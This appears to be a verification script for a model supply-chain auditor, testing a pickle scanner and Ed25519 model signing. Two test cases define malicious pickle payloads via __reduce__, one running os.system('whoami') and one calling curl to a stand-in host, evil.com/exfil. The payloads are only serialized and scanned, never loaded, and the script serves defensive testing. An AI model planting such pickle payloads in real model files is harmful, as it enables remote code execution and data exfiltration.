"""Model Supply Chain Auditor — End-to-end verification.

Tests pickle scanning and model signing with real payloads.
All payloads use real attack techniques; none are executed.
"""
import os
import pickle  # noqa: S403 - intentional: this file tests the pickle scanner itself
import sys
import tempfile

sys.path.insert(0, ".")

import logging; logging.info("=" * 60)
import logging; logging.info("MODEL SUPPLY CHAIN AUDITOR — VERIFICATION")
import logging; logging.info("=" * 60)

# 1. Pickle Scanner — Safe model
import logging; logging.info("\n[1/4] Scanning safe pickle (numpy array)...")
from src.scanners import scan_pickle_bytes
import numpy as np

safe_data = pickle.dumps({"weights": np.array([1.0, 2.0, 3.0]), "bias": 0.5})  # noqa: S301
result = scan_pickle_bytes(safe_data)
import logging; logging.info(f"  Risk level: {result.risk_level}")
import logging; logging.info(f"  Malicious: {result.is_malicious}")
assert result.risk_level == "safe", f"Expected safe, got {result.risk_level}"

# 2. Pickle Scanner — Malicious payload (os.system)
import logging; logging.info("\n[2/4] Scanning malicious pickle (os.system RCE)...")


class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ("whoami",))


malicious_data = pickle.dumps(MaliciousPayload())  # noqa: S301
result = scan_pickle_bytes(malicious_data)
import logging; logging.info(f"  Risk level: {result.risk_level}")
import logging; logging.info(f"  Findings: {[f.message for f in result.findings]}")
import logging; logging.info(f"  Dangerous imports: {result.dangerous_imports}")
assert result.risk_level in ("suspicious", "malicious"), f"Should detect danger, got {result.risk_level}"

# 3. Pickle Scanner — subprocess attack
import logging; logging.info("\n[3/4] Scanning malicious pickle (subprocess.Popen)...")
import subprocess


class SubprocessPayload:
    def __reduce__(self):
        return (subprocess.Popen, (["curl", "http://evil.com/exfil"],))


malicious_data2 = pickle.dumps(SubprocessPayload())  # noqa: S301
result2 = scan_pickle_bytes(malicious_data2)
import logging; logging.info(f"  Risk level: {result2.risk_level}")
import logging; logging.info(f"  Dangerous imports: {result2.dangerous_imports}")
assert result2.risk_level in ("suspicious", "malicious")

# 4. Model Signing
import logging; logging.info("\n[4/4] Model signing and verification (Ed25519)...")
from src.signing import generate_signing_keypair, sign_model, verify_model

with tempfile.NamedTemporaryFile(suffix=".pt", delete=False) as f:
    f.write(safe_data)
    model_path = f.name

try:
    private_key, public_key = generate_signing_keypair()
    import logging; logging.info("  Generated Ed25519 keypair")

    sig = sign_model(model_path, private_key, signer="test-pipeline")
    import logging; logging.info(f"  Model hash: {sig.model_hash[:16]}...")
    import logging; logging.info(f"  Signature: {sig.signature[:16].hex()}...")
    import logging; logging.info(f"  Signer: {sig.signer}")

    valid = verify_model(model_path, sig, public_key)
    import logging; logging.info(f"  Verification (unmodified): {valid}")
    assert valid, "Signature should be valid"

    with open(model_path, "ab") as f:
        f.write(b"TAMPERED")
    tampered = verify_model(model_path, sig, public_key)
    import logging; logging.info(f"  Verification (tampered): {tampered}")
    assert not tampered, "Tampered model should fail verification"
finally:
    os.unlink(model_path)

import logging; logging.info("\n" + "=" * 60)
import logging; logging.info("ALL CHECKS PASSED — VERIFICATION COMPLETE")
import logging; logging.info("=" * 60)
